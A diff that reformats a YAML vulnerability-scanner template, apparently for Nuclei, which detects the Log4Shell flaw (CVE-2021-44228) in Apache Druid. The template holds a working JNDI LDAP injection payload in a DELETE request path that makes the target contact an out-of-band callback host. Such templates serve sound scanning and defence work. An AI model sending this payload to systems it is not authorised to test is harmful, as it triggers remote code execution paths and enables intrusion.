@@ -1,5 +1,4 @@
 id: apache-druid-log4j-rce
-
 info:
   name: Apache Druid - Remote Code Execution (Apache Log4j)
   author: SleepingBag945
@@ -9,34 +8,30 @@ info:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10
     cve-id: CVE-2021-44228
-    cwe-id: CWE-502
+    cwe-id: CWE-502,CWE-77
     cpe: cpe:2.3:a:apache:druid:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
+    runzero-review: REJECT/2025-11-07/uses interactsh
     max-request: 1
-    shodan-query: title:"Apache Druid"
     product: druid
+    shodan-query: title:"Apache Druid"
     vendor: apache
-  tags: cve,cve2021,rce,jndi,log4j,apache,druid,oast,kev,vuln
-
+    verified: true
+  tags: apache,cve,cve2021,druid,jndi,kev,log4j,oast,rce,vuln
 http:
-  - method: DELETE
-    path:
-      - "{{BaseURL}}/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2f{{interactsh-url}}%2ftea%7d"
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
+  - matchers:
+      - part: interactsh_protocol
+        type: word
         words:
-          - "dns"
-
-      - type: word
-        part: header
+          - dns
+      - part: header
+        type: word
         words:
-          - "application/json"
-
-      - type: status
-        status:
+          - application/json
+      - status:
           - 404
-# digest: 4a0a00473045022100f513f43c58c2050212ed809a42feb07aa73ce910533eb6040dc3f564184dceb5022024588fbb2177035a8e743b6f62c690c8ca7d612b784952fc15e60c9756fae5fe:922c64590222798bb761d5b6d8e72950
+        type: status
+    matchers-condition: and
+    method: DELETE
+    path:
+      - '{{BaseURL}}/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2f{{interactsh-url}}%2ftea%7d'
